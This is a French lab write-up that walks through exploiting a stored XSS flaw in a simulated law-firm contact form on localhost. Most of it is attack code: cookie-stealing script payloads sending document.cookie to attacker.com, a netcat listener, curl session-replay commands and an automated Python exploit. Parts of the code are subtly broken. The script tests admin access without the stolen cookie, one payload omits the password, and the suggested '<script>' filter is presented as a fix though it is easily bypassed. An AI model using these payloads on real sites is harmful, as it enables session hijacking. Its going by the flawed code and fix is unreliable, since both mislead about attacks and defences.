# Writeup - XSS Stored Vulnerability Lab

## 🎯 Objectif du Lab

Ce laboratoire simule un cabinet d'avocats avec une vulnérabilité **XSS Stockée (Stored XSS)** dans le formulaire de contact. L'objectif est d'exploiter cette vulnérabilité pour voler la session administrateur et accéder à des données sensibles.

## 🔍 Analyse de la Vulnérabilité

### Vulnérabilité Identifiée
- **Type** : XSS Stockée (Stored XSS)
- **Localisation** : Formulaire de contact (`/submit-contact`)
- **Cause** : Absence de sanitisation des entrées utilisateur
- **Impact** : Exécution de JavaScript malveillant dans le contexte de l'administrateur

### Code Vulnérable
```javascript
// Dans server.js - ligne 47
db.run(`INSERT INTO messages (id, name, email, subject, message) VALUES (?, ?, ?, ?, ?)`,
       [messageId, name, email, subject, message], (err) => {
    // Aucune sanitisation du paramètre 'message'
});
```

## 🚀 Étapes d'Exploitation

### Étape 1 : Reconnaissance

1. **Accéder au site** : `http://localhost:3206`
2. **Identifier le formulaire de contact** : Page `/contact`
3. **Analyser les champs** : Nom, Email, Sujet, Message

### Étape 2 : Injection du Payload XSS

1. **Aller sur la page Contact**
2. **Remplir le formulaire avec le payload malveillant** :

```html
<script>
// Payload pour voler les cookies de session
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Ou utiliser ce payload plus avancé :**
```html
<script>
// Payload pour voler les cookies et les envoyer à un serveur d'attaque
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));
xhr.send();
</script>
```

### Étape 3 : Déclenchement de l'Exploit

1. **Soumettre le formulaire** avec le payload XSS
2. **Attendre que l'admin visite** le tableau de bord (bot automatique)
3. **Le JavaScript s'exécute** dans le contexte de l'administrateur

### Étape 4 : Vol de Session

1. **Intercepter les cookies** envoyés par le payload
2. **Utiliser la session volée** pour se connecter en tant qu'admin

## 🛠️ Méthodes d'Exploitation

### Méthode 1 : Utilisation d'un Serveur d'Attaque

1. **Démarrer un serveur d'écoute** :
```bash
# Python 3
python3 -m http.server 8080

# Ou avec netcat
nc -lvp 8080
```

2. **Payload adapté** :
```html
<script>
fetch('http://localhost:8080/steal?cookie=' + document.cookie);
</script>
```

### Méthode 2 : Exploitation Directe

1. **Payload pour afficher les cookies** :
```html
<script>alert(document.cookie);</script>
```

2. **Payload pour rediriger** :
```html
<script>window.location='http://attacker.com/steal?cookie='+document.cookie;</script>
```

### Méthode 3 : Exploitation Avancée

1. **Payload pour voler et utiliser la session** :
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', '/admin-login', false);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    username: 'admin',
    
}));

// Envoyer les cookies volés
fetch('http://attacker.com/steal?cookie=' + document.cookie + '&session=' + xhr.getResponseHeader('Set-Cookie'));
</script>
```

## 🔐 Accès Administrateur

### Avec la Session Volée

1. **Récupérer le cookie de session** depuis les logs d'attaque
2. **Utiliser le cookie** pour accéder au tableau de bord admin :
```bash
curl -H "Cookie: session=COOKIE_VOLE" http://localhost:3206/admin
```

### Accès Direct (Alternative)

Si vous connaissez les credentials :
```bash
curl -X POST http://localhost:3206/admin-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"***"}'
```

## 🎯 Exploitation Complète

### Script d'Exploitation Automatisé

```python
import requests
import time

def exploit_xss():
    # Étape 1: Injecter le payload XSS
    payload = '''
    <script>
    fetch('http://localhost:8080/steal?cookie=' + document.cookie);
    </script>
    '''
    
    data = {
        "name": "Attacker",
        "email": "attacker@evil.com", 
        "subject": "Important",
        "message": payload
    }
    
    response = requests.post(
        "http://localhost:3206/submit-contact",
        json=data
    )
    
    print("✅ Payload XSS injecté")
    
    # Étape 2: Attendre que l'admin visite (bot automatique)
    print("⏳ Attente du déclenchement...")
    time.sleep(30)
    
    # Étape 3: Vérifier l'accès admin
    admin_response = requests.get("http://localhost:3206/admin")
    print("🎯 Accès admin:", "SUCCESS" if admin_response.status_code == 200 else "FAILED")

if __name__ == "__main__":
    exploit_xss()
```

## 🏆 Validation de l'Exploit

### Vérification des Résultats

1. **Vérifier les logs du serveur d'attaque** pour les cookies volés
2. **Tester l'accès admin** avec la session volée
3. **Accéder aux données sensibles** : `/internal-data`

### Commandes de Validation

```bash
# Vérifier que le payload est stocké
curl http://localhost:3206/api/messages

# Tester l'accès admin
curl -H "Cookie: session=SESSION_VOLE" http://localhost:3206/admin

# Accéder aux données internes
curl -H "Cookie: session=SESSION_VOLE" http://localhost:3206/internal-data
```

## 🛡️ Contre-Mesures

### Pour Sécuriser l'Application

1. **Sanitisation des entrées** :
```javascript
const DOMPurify = require('dompurify');
const sanitizedMessage = DOMPurify.sanitize(message);
```

2. **Content Security Policy (CSP)** :
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

3. **Validation côté serveur** :
```javascript
// Rejeter les entrées contenant des balises script
if (message.includes('<script>')) {
    return res.status(400).json({ error: 'Invalid input' });
}
```

## 📚 Concepts Appris

- **XSS Stockée** : Vulnérabilité persistante
- **Vol de Session** : Exploitation des cookies
- **Élévation de Privilèges** : Accès admin via session volée
- **Contre-Mesures** : Sanitisation et CSP

## 🎉 Conclusion

Ce lab démontre l'importance de la sanitisation des entrées utilisateur et l'impact d'une vulnérabilité XSS stockée. L'exploitation permet d'obtenir un accès administrateur non autorisé, soulignant la nécessité de mesures de sécurité appropriées.

---

*Lab créé à des fins éducatives pour comprendre les vulnérabilités web et les contre-mesures.* 